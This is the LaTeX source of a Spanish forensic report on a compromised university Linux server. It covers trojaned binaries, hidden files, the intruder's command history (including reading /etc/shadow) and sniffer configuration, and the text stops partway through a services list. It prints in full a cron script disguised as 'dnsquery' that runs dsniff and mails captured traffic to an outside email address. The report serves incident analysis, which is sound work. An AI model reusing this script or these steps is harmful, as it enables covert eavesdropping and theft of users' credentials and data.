\documentclass{article}
\usepackage[spanish,activeacute]{babel}
\usepackage{isolatin1}
\usepackage{alltt}
\usepackage{fancyhdr}



\voffset          0.5mm
\hoffset         20.0mm
\topmargin      -16.0mm
\oddsidemargin  -11.0mm
\evensidemargin -11.0mm
\textheight     235.0mm
\textwidth      165.0mm
\columnsep        5.0mm
\parindent        1.0em
\headsep          6.3mm
\headheight      12.0pt
\lineskip         2.0pt
\normallineskip   2.0pt
\def\baselinestretch{0.8}
\linespread{1.0}
\looseness=1
\parskip 10.0pt





\lhead{\textbf{\textsf{An�lisis forense del ataque e intrusi�n a xxx.xxx.xxx.1}}}
\chead{\footnotesize \textbf{\textsf{}}}
\rhead{\footnotesize \textbf{\textsf{Pag. \thepage}}}
\lfoot{Departamento de redes}
\cfoot{Linux OpenSource de M'exico}
\rfoot{Reporte de seguridad en c�mputo}



\begin{document}


{\tiny \TeX }

\vskip 25mm

\begin{center} {\large {\bf An'alisis forense de un ataque e intrusi'on a un sistema de producci'on real.}}
\end{center}

\vskip 15mm

\begin{center} {\bf Alexis Real Santill'an.}\\
Instituto De F'isica y Mat'ematicas.\\
Universidad Michoacana de San N'icolas de Hidalgo.
\vskip 3mm
Traducci'on: Jonatan Soffer Hern'andez\\ 
Linux Opensource de Mexico S.A de C.V.
\end{center} 
\vskip 5mm

\centerline {Enero, 2005}
\vskip 15mm

\abstract{ El presente reporte es una investigaci'on forense sobre el
ataque e intrusi'on ocurridos al servidor xxx.xxx.xxx.1
(victima1.com).
\footnote{El contenido del reporte real est'a condensado en el
presente documento dada su extension. El an'alisis completo con las
fuentes ocupar'ia varios millones de paginas impresas.}  la intrusi'on
ocurrida pudo poner en serio riesgo la informaci'on almacenada en los
servidores y los datos confidenciales de los usuarios.  Las
caracter'isticas particulares presentadas por este ataque amerit'o un
an'alisis forense para poder evaluar el riesgo real, el nivel de
compromiso, la informaci'on que podr'ia haber sido sustra'ida, as'i
como tratar de develar la identidad y origen del atacante. Se hicieron
an'alisis con el equipo funcionando y {\em post mortem}, adem'as de la
reconstrucci'on de actividades en equipos de control.
\footnote{ Los datos y resultados obtenidos y que son normales en un
sistema no comprometido o de control ser'an excluidos de este reporte
si no implican ninguna ayuda o son irrelevantes en alguna de las
l'ineas de investigaci'on seguidas.}  }


 \newpage
\pagestyle{fancy}

 
\subsection*{Descripci'on del sistema}

 {\bf Nombre:} victima1

 {\bf Dominio:} foo.bar.mx

 {\bf Ip:} xxx.xxx.xxx.1

 {\bf Funci'ones:} Servidor de correo, servidor de archivos, servidor gr'afico.

 {\bf Marca:} Gen'erico ensamblado.

 {\bf Procesador:} Intel Pentium III 750 MHz.

 {\bf Memoria:} 256 MB RAM.

 {\bf Discos:} IDE ATA 66 20 GB.
 
 {\bf Sistema Operativo:} GNU/Linux Debian 3.0-r1.  

\subsection*{Ubicaci'on f'isica del sistema}

 El equipo estudiado estaba instalado en el edificio xxx del campus. Su conexi'on al switch general era por medio de una 
tarjeta de red ethernet con topolog'ia de estrella. Compart'ia directorios con el servidor \verb+xxx.xxx.xxx.2+ 
y hab'ia acceso para usuarios por consola y terminal gr'afica. 


\section*{Reporte}

A mediados del mes de abril la administraci'on de c'omputo descubri'o
que el equipo estudiado ten'ia sembrados programas con permisos de
root no autorizados. Se procedi'o a hacer una b'usqueda de todos los
programas cuyo propietario fuera root, y tambi'en los que tuvieran el
bit {\bf SUID} y/o {\bf SGID} en todo el disco duro. Esta b'usqueda
di'o como resultado que el usuario duende \footnote{En todo el
informe, ser'an utilizados los nombres de login tal como aparecen en
los archivos de registro de las m'aquinas, y nunca los nombres reales
de los usuarios.} ten'ia guardados programas que a primera vista no
necesitaban esta caracter'istica para funcionar. Se procedi'o entonces
a cambiar los permisos adicionales de estos programas a los permisos
normales, mas como el hecho mostraban caracter'isticas sospechosas se
hizo un an'alisis completo del sistema. Los programas con los bits
{\bf SUID} y/o {\bf SGID}, son programas que corren con el
identificador del usuario que los creo no como el que los ejecut'o,
entre otras funciones particulares.

Los resultados de b'usqueda de archivos {\bf SUID} y {\bf SGID} fuera de lo com'un en toda la m'aquina
son los siguientes:
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{alltt}
702242   92 -rwsr-sr-x   1 root     root        88531 Feb 11  1999 /home/staff/duende/prog/bin/registro
620791   20 -rwsrwsr-x   1 root     root        18256 Jan  9  2000 /home/staff/duende/prog/gtk/registros
\end{alltt}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
Hasta este momento no se sospechaba en particular del usuario duende o 500, que
para la m'aquina y nosotros son y ser'an id'enticamente el mismo.\footnote{
Usaremos indistintamente el n'umero de identificaci'on del sistema (id) o el
nombre del usuario seg'un sea el resultado de cada tipo de b'usqueda o
estudio.} 

En seguida se hizo una b'usqueda de archivos que pertenecieran a
usuarios distintos de root o 0 (que son id'enticamente el mismo) y que
estuvieran guardados en sitios impropios, como los directorios de
sistema.

Los archivos no pertenecientes a root que se encuentran en los 'arboles
de directorios del sistema son los siguientes:
\vspace{3mm}

\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
501289   24 -rwxr-xr-x   1 500      users       22837 Apr 11 16:18 ./usr/bin/top
501292   24 -rwxr-xr-x   1 500      users       22837 Apr 11 16:19 ./usr/bin/pstree
388613   24 -rwxr-xr-x   1 500      users       20705 Apr 11 16:24 ./usr/bin/getty
227367  392 -rwxr-xr-x   1 500      users      395235 Apr 15 20:23 ./usr/lib/popclean
227360    4 -rwxr-xr-x   1 500      users        1013 Apr 15 20:23 ./usr/local/lib/dsniff.services
227358    4 -rwxr-xr-x   1 500      users         236 Apr 15 20:23 ./etc/cron.daily/dnsquery
501288   24 -rwxr-xr-x   1 500      users       22837 Apr 11 16:13 ./bin/ps
388620   32 -rwxrwxr-x   1 500      users       29220 Mar 18  2002 ./bin/kevent
469100    4 -rwxr-xr-x   1 500      users         475 Nov 14  2002 ./bin/endl
501291   24 -rwxr-xr-x   1 500      users       22837 Apr 11 16:13 ./bin/netstat
227355  708 -rwxr-xr-x   1 500      users      718863 Apr 11 16:13 ./bin/sysinit
324280    4 -rwxr-xr-x   1 501      users         240 Oct  1  2002 ./bin/weit
227351    4 -rwxr-xr-x   1 500      users         627 Mar  8 06:14 ./dev/rd/c2d3b2
227352    4 -rwxr-xr-x   1 500      users         531 Nov 14  2002 ./dev/rd/c6d0b2
227353    4 -rwxr-xr-x   1 500      users         512 Nov 14  2002 ./dev/rd/c6d3b2
130454    4 -rwxr-xr-x   1 500      users          36 Nov 14  2002 ./dev/.libn
130456    4 -rwxr-xr-x   1 500      users          66 Mar  8 06:12 ./dev/.libpt
130461    4 -rwxr-xr-x   1 500      users          69 Mar  8 06:13 ./dev/.libtr
130458    4 -rwxr-xr-x   1 500      users          65 Mar  8 06:12 ./dev/.libtp
533480    4 drwxr-xr-x   2 500      users        4096 May  9 19:05 ./dev/zqft4
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vspace{3mm}

Ninguno de los programas que aparecen en la lista debe de pertenecer a alguno de
esos usuarios.

Los archivos:

\vskip 3mm
\centerline {$------------------------------------------------------------------------------------------------------------------------------------$}
{\footnotesize
\begin{verbatim}
501289   24 -rwxr-xr-x   1 500      users       22837 Apr 11 16:18 ./usr/bin/top
501292   24 -rwxr-xr-x   1 500      users       22837 Apr 11 16:19 ./usr/bin/pstree
388613   24 -rwxr-xr-x   1 500      users       20705 Apr 11 16:24 ./usr/bin/getty
501288   24 -rwxr-xr-x   1 500      users       22837 Apr 11 16:13 ./bin/ps
388620   32 -rwxrwxr-x   1 500      users       29220 Mar 18  2002 ./bin/kevent
469100    4 -rwxr-xr-x   1 500      users         475 Nov 14  2002 ./bin/endl
501291   24 -rwxr-xr-x   1 500      users       22837 Apr 11 16:13 ./bin/netstat
227355  708 -rwxr-xr-x   1 500      users      718863 Apr 11 16:13 ./bin/sysinit
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

son archivos muy importantes para el sistema que tienen
la funci'on de mostrar los procesos y programas que se est'an ejecutando
en la m'aquina, as'i como las conexiones por red que mantiene el equipo
en un momento determinado.
 
 Los archivos:


\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
130454    4 -rwxr-xr-x   1 500      users          36 Nov 14  2002 ./dev/.libn
130456    4 -rwxr-xr-x   1 500      users          66 Mar  8 06:12 ./dev/.libpt
130461    4 -rwxr-xr-x   1 500      users          69 Mar  8 06:13 ./dev/.libtr
130458    4 -rwxr-xr-x   1 500      users          65 Mar  8 06:12 ./dev/.libtp
533480    4 drwxr-xr-x   2 500      users        4096 May  9 19:05 ./dev/zqft4
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

no deber'ian existir en un sistema normal, y el punto antes del nombre
indica que el archivo es oculto.\\

 Los archivos:

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
227367  392 -rwxr-xr-x   1 500      users      395235 Apr 15 20:23 ./usr/lib/popclean
227360    4 -rwxr-xr-x   1 500      users        1013 Apr 15 20:23 ./usr/local/lib/dsniff.services
227358    4 -rwxr-xr-x   1 500      users         236 Apr 15 20:23 ./etc/cron.daily/dnsquery
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

son muy sospechosos y ser'an analizados con detalle pues est'an
relacionados entre si.

 Se observa que la gran mayor'ia de los archivos extra�os pertenecen al
usuario 500 o duende, por lo tanto sera investigado de manera
particular pero no exclusiva como se vera mas adelante.\\
 

La b'usqueda de archivos cuyo due�o es el usuario 500 seg'un el comando find
di'o como resultado solo los archivos arriba listados y los de su
directorio: \verb+/home/staff/duende+. Los otros n'umeros de usuario no dan
ninguna otra salida adem'as de las normales.

 
Se procedi'o a ver el contenido de los registros de la cuenta
duende por medio de los archivos history y \verb+.bash_history+. Estos
archivos guardan la lista de comandos ejecutados por los usuarios
durante los accesos a la m'aquina. Un usuario normal y que no esta
ocultando nada, tiene todos los comandos que se ejecutaron desde que
se abri'o la cuenta o se reinstal'o el sistema, hasta la 'ultima vez que
accedi'o al servidor. La limpieza de bit'acoras es el primer rastro que
se intenta eliminar en un ataque inform'atico.

 La revisi'on de las bit'acoras del usuario di'o:\\
  
 \verb+.bash_history+ esta vac'io. Quiz'a el usuario no usa \verb+bash+ como {\bf shell}.
 
 \verb+.history+ es la bit'acora del {\bf shell} \verb+tcsh+, y nos muestra comandos
normales pero antiguos y escasos.  Quiz'a se limpio intencionalmente.

 Como estos archivos no nos dan informaci'on actual de la actividad del
usuario, se procedi'o a revisar bit'acoras existentes poco conocidas por
los administradores, y por lo tanto pocas veces limpiadas en una
intrusi'on.  Una de estas bit'acoras es manejada por el navegador de
directorios {\bf Midnight Commander} (mc) del cual pocas personas saben que
hace registro de su actividad. Los registros de {\bf mc} se actualizan
peri'odicamente; esto es, que cada cierto tiempo se limpia el archivo
\verb+history+ de {\bf mc}, y no podemos decir que los comandos ah'i almacenados son
muy antiguos.\\


Los resultados de revisar la bit'acora \verb+history+ en el directorio \verb+.mc+ es
la siguiente:

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
[Dir Hist Directorio Personal]
0=/home/staff/duende/.gnome-desktop/Directorio Personal

[Dir Hist duende]
0=/home/staff/duende/.gnome-desktop/duende
1=/home/staff/duende/.gnome-desktop/duende/doc
2=/home/staff/duende/.gnome-desktop/duende
3=/home/staff/duende/.gnome-desktop/duende/doc
4=/home/staff/duende/.gnome-desktop/duende
5=/home
6=/usr/local/netscape

[name]

56=.bash_history
57=pop.log
59=test*

[Dir Hist New Left Panel]
0=/etc
1=/
2=/root
3=/root/chkrootkit-0.40
4=/root
5=/root/victima1-rh
6=/root

27=/root
28=/root/archivos
29=/root
30=/root/pine
31=/root
32=/
33=/sbin
34=/
35=/tmp
36=/
37=/etc
38=/etc/cron.d
39=/etc
40=/etc/cron.daily
41=/etc
42=/
43=/usr
44=/usr/lib
45=/usr
46=/home/staff/duende
47=/home/staff
48=/home/staff/duende
49=/home/staff/duende/xm
50=/home/staff/duende
51=/home/staff/duende/o0o.tar#utar
52=/home/staff/duende/o0o.tar#utar/s8exp
53=/home/staff/duende/o0o.tar#utar
54=/home/staff/duende
55=/home/staff
56=/var/mail
57=/var
58=/home/staff/duende
59=/var/log

[Dir Hist New Right Panel]

23=/home/est/proa
24=/home/staff/duende
25=/home/est/zopilote
26=/home/est/proa
27=/home/est/zopilote
28=/tmp
29=/home/est/zena
30=/home/staff/duende
31=/home/est/zena
32=/tmp
33=/tmp/.sxp
34=/tmp
35=/home/est/zena
36=/home/staff/duende
37=/tmp
38=/tmp/.sxp
39=/tmp
40=/
41=/temporal
42=/
43=/home/staff/duende
44=/home/staff/duende/prog/c/lc
45=/home/staff/duende
46=/home/staff/duende/prog/c/uno
47=/dev
48=/dev/zqft4
49=/home/staff/duende/prog/c/uno
50=/home/staff/duende/prog/c
51=/home/staff/duende
52=/home/staff/duende/xm
53=/home/staff/duende
54=/dev
55=/dev/zqft4
56=/dev
57=/home/staff/duende
58=/home/staff
59=/home/staff/duende

[cmdline]
3=ee ladiva.rgb 
9=cd temp
10=make
11=make -f makefile.linux
12=vi makefile.linux 
13=make -f makefile.linux
14=sh fixunix.sh 
15=cp Makefile.unx Makefile
16=make
17=cd
18=cd bajar
19=cd
20=cd /usr/local/include
21=cd bajar
22=[6~[6~[6~
23=cd
24=cd /tmp
25=ls -lF
26=more sm 
27=less sm 
28=ls -lF
29=cd /home/est/proa
30=[21~0
31=cd /tmp
32=qdate
33=date
34=[21~0
35=cd /home/est/zena
36=cd /tmp
37=cd /home/est/zena
38=cd /tmp
39=du -h
40=w
41=cd /home/staff
42=cd /tmp
43=cd /etc
44=less shadow
45=cd /var/log
46=cd /dev
47=ls -lFa dnsquery 
48=cd /etc
49=chown root.root dnsquery 
50=cd /home/staff/duende/
51=cd /dev
52=cd
53=ld -lFa dnsquery 
54=ls -lFa dnsquery 
55=cd
56=date
57=cd /var/mail
58=ls -lFa .bash_history 
59=cd /var/log

\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
 
 La 'ultima fecha de modificaci'on de este archivo es el 27 de abril,
esto indica que el programa fue usado hasta el ultimo d'ia que estuvo
activo el servidor.
 
 \vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
-rw-------    1 500      500          7676 Apr 27 04:29 .mc/history
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Este archivo nos brinda una gran cantidad de evidencia que muestra
que el usuario duende accesaba y le'ia los archivos impropios que
est'an a su nombre en la m'aquina, y tambi'en a los que no lo est'an pero
son objeto de investigaci'on. Las l'ineas bajo un campo \verb+Dir+ indican
acceso a directorios en alguno de los dos paneles del
navegador. \verb+cmndline+ muestra los comandos ejecutados por el usuario.

 Es de notar el acceso a \verb+/root+, el directorio del superusuario, este
es un directorio donde ning'un usuario tiene que acceder y menos
revisar el contenido de los directorios restringidos que ah'i est'an
alojados.

 Una l'inea muestra que se trato de leer el contenido de \verb+/etc/shadow+ el
archivo de passwords, el cual solo el superusuario tiene la capacidad
de leer, y un atacante solo puede verlo si tiene acceso a la cuenta
restringida root. Cabe mencionar que el usuario duende no es root del
sistema y no tiene ninguna funci'on administrativa, as'i que el acceso a
esos archivos es una actividad prohibida, teniendo adem'as que
mencionar que esta es una cuenta de alguien que ya no pertenece a la instituci'on.

Otra l'inea mas, muestra que se trato de cambiar el due�o de \verb+dnsquery+,
que tiene asignado el propietario duende, por el de
root. Esta l'inea es se�al inequ'ivoca de que usuario ten'ia acceso a la
cuenta root, pues solo root puede hacer este tipo de cambios.


A continuaci'on, se comentar'an algunas l'ineas importantes en esta
bit'acora:
 

 Se acces'o al archivo .bash\_history.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	56=.bash_history
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm	
 Se acces'o al archivo pop.log.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	57=pop.log
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
 Se acces'o a los archivos test.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	59=test*
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
 Se acces'o al directorio root.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	2=/root
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
 Se revis'o el contenido de un directorio instalado para auditar el
sistema, y cuya funci'on sera explicada mas adelante.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	3=/root/chkrootkit-0.40
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
 
 Se acces'o a otros directorios en \verb+/root+
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	5=/root/victima1-rh
	28=/root/archivos
	29=/root
	30=/root/pine
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
 Se acces'o a \verb+/sbin+ y \verb+/tmp+, despu'es se vera el porque.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	33=/sbin
	35=/tmp
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
 Se ingres'o al directorio \verb+/etc/cron.d+ y \verb+/etc/cron.daily+, estos son
directorios donde se alojan las tareas programadas para ejecutarse peri'odicamente, en este caso
a diario.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	38=/etc/cron.d
	40=/etc/cron.daily
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
 Se ingres'o a \verb+/usr/lib+, donde se alojan las bibliotecas de
 programaci'on.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}	
	44=/usr/lib
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
 Se acces'o al directorio \verb+xm+ en su home, directorio que se estudiar'a
 m'as adelante.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}	
	49=/home/staff/duende/xm
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm	
 Se desempaquet'o \verb+o0o.tar+.	
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	51=/home/staff/duende/o0o.tar#utar
	52=/home/staff/duende/o0o.tar#utar/s8exp
	53=/home/staff/duende/o0o.tar#utar
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Acces'o a \verb+/var/mail+, el directorio del correo, quiz'a con la intenci'on
de leer correo ajeno o buscar informaci'on escondida ah'i, como se vera
despu'es.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	56=/var/mail
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm	
Se acces'o a \verb+/var/log+, el directorio donde se registra la actividad de
la m'aquina, quiz'a con la intenci'on de revisar las bit'acoras o eliminar
informaci'on almacenada ah'i.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}	
	59=/var/log

[Dir Hist New Right Panel]
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
Se acces'o a los directorios de proa, zena y zopilote.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}

	23=/home/est/proa
	25=/home/est/zopilote
	26=/home/est/proa
	27=/home/est/zopilote
	29=/home/est/zena
	31=/home/est/zena
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
Se ejecut'o un programa oculto en \verb+/tmp+, directorio donde la m'aquina
pone archivos temporales que son eliminados siempre que reinicia el
equipo.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	32=/tmp
	33=/tmp/.sxp
	35=/home/est/zena
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm	
 Se acces'o al directorio \verb+prog/c/lc+, donde supuestamente hay programas
que sirven para el an'alisis de secuencias gen'eticas y programas
hechos por el propio usuario duende.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	44=/home/staff/duende/prog/c/lc
	46=/home/staff/duende/prog/c/uno
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

Se acces'o al directorio \verb+/dev/zqft4+, directorio sospechoso y que no
deber'ia de existir en ese lugar.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	48=/dev/zqft4
	

[cmdline]
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
 Se trato de ver una imagen que pertenece al usuario brenton, y por
consiguiente debi'o de ser sustra'ida de sus documentos.
 \vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	3=ee ladiva.rgb 
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
En estas l'ineas se edit'o y compilo un programa en \verb+/tmp+, despu'es se
corri'o el script \verb+fixunix.sh+
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	9=cd temp
	10=make
	11=make -f makefile.linux
	12=vi makefile.linux 
	13=make -f makefile.linux
	14=sh fixunix.sh 
	15=cp Makefile.unx Makefile
	16=make

\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
 Se ingres'o al directorio \verb+bajar+ dentro de \verb+/home/staff/duende+, y de ah'i
de regreso a \verb+/tmp+, parece que el usuario se hallaba muy nervioso pues se
equivoca con mucha frecuencia. Continua el patr'on anterior de ingresos
a directorios. Se obtuvo informaci'on del sistema como la fecha, uso
del disco y usuarios conectados.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	18=cd bajar
	20=cd /usr/local/include
	21=cd bajar
	22=[6~[6~[6~
	23=cd
	24=cd /tmp
	25=ls -lF
	26=more sm 
	27=less sm 
	28=ls -lF
	29=cd /home/est/proa
	30=[21~0
	31=cd /tmp
	32=qdate
	33=date
	34=[21~0
	35=cd /home/est/zena
	36=cd /tmp
	37=cd /home/est/zena
	38=cd /tmp
	39=du -h
	40=w
	41=cd /home/staff
	42=cd /tmp
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
 En estas l'ineas se ley'o el contenido de \verb+/etc/shadow+, el archivo de
contrase�as. Esto es signo de que el usuario ten'ia acceso a funciones
de root. Luego se fue a \verb+/var/log+ para revisar los registros del
sistema.

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	43=cd /etc
	44=less shadow
	45=cd /var/log
	46=cd /dev
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
 Se list'o el archivo \verb+dnsquery+, y luego se intent'o cambiar el
propietario de ese archivo de duende a root. Lo anterior es muestra
de los atributos de root de este usuario. Estas l'ineas muestran el
innegable intento por parte del usuario de ocultar y eliminar
evidencias.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	47=ls -lFa dnsquery 
	48=cd /etc
	49=chown root.root dnsquery 
	50=cd /home/staff/duende/
	51=cd /dev
	52=cd
	53=ld -lFa dnsquery 
	54=ls -lFa dnsquery 
	55=cd
	56=date
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
Se revis'o el directorio \verb+/var/mail+, y se list'o el archivo \verb+.bash\_history+
dentro de el, este archivo no deber'ia estar ah'i y es por dem'as
sospechoso.
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
	57=cd /var/mail
	58=ls -lFa .bash_history 
	59=cd /var/log
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
	
\subsection*{Contenido y funci'on de archivos y programas}
 
Se revisara ahora el contenido y funci'on de muchos de los archivos
sospechosos:\\
Se estudiaran primero los archivos en el directorio \verb+/dev+ que no sean
parte de la instalaci'on original.\\
 
El contenido de \verb+.libn+ es: 

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}   
kis
ircd
6667
186
17749
56321
51759
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm 
 
 El contenido de \verb+.libpt+ es:
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
dnsquery
-bash
linux
sysinit
db
identd
plogd
screen
ecko
popclean
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
  
 El contenido de \verb+.libtp+ es:
 
 \vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
 -bash
linux
dnsquery
sysinit
identd
plogd
db
screen
.tp
popclean
 \end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
 
 El contenido de \verb+.libtr+ es:
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
-bash
linux
dnsquery
sysinit
identd
plogd
db
screen
.tp
popclean
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 El contenido de estos archivos, muestra informaci'on sobre procesos
que seguramente leen otros programas durante su ejecuci'on como se vera
mas adelante.


El archivo \verb+/etc/cron.daily/dnsquery\verb+ contiene lo siguiente:

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}

#!/bin/sh
cd /usr/lib/
./popclean -r pop.log > test
mail eckosniffer@yahoo.com -s "Sniff $(uname -a)" < test
kill -9 `/sbin/pidof /usr/lib/popclean`
rm -rf test pop.log
A=$PATH
export PATH=/usr/lib/
popclean -w pop.log &
export PATH=$A

\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
 
El script anterior ejecuta todos los d'ias un programa llamado
\verb+popclean+, el cual lee su configuraci'on desde \verb+pop.log+, la salida es entonces
salvada al archivo \verb+test+, en seguida se env'ia el contenido del archivo
a una direcci'on de correo en yahoo, se mata el proceso en ejecuci'on y
se borran los archivos generados. Este es el programa al cual el
usuario duende trato de cambiar el propietario con el fin de ocultar
su existencia.\\


 Veamos que es el archivo \verb+popclean+:
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim} 
  
popclean: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.0, 
dynamically linked (uses shared libs), not stripped

\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 es un ejecutable para linux.

Extrayendo las cadenas de texto en este archivo binario, obtenemos
(suprimiendo cientos de l'ineas y quedandonos con solo las mas
reveladoras):

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
Version: 2.3
Usage: dsniff [-cdmn] [-i interface] [-s snaplen] [-f services]
              [-t trigger[,...]] [-r|-w savefile] [expression]
cdf:i:mnr:s:t:w:h?V
record_init
nids_init: %s
/usr/local/lib/dsniff.magic
/usr/local/lib/dsniff.services
listening on %s [%s]
listening on %s
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

El programa es en realidad \verb+dsniff+. \verb+dsniff+ es uno de los llamados
sniffers, su uso es capturar la informaci'on que pasa por las
tarjetas de red conectadas al sistema. Este programa corr'ia a diario y enviaba resultados a
una cuenta de correo.


 El contenido de \verb+/usr/local/lib/dsniff.services+ es el siguiente:
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
vrrp		112/ip
ospf		89/ip
pptp		47/ip
icq		4000/udp
mmxp		2417/udp
sniffer		2001/udp
tds		1433/udp
rip		520/udp
mmxp		417/udp
snmp		161/udp
portmap		111/udp
portmap		-111/udp
pcanywhere	65301/tcp
aim		9898/tcp
napster		8888/tcp
http		8080/tcp
napster		7777/tcp
tds		7599/tcp
irc		6669/tcp
irc		6668/tcp
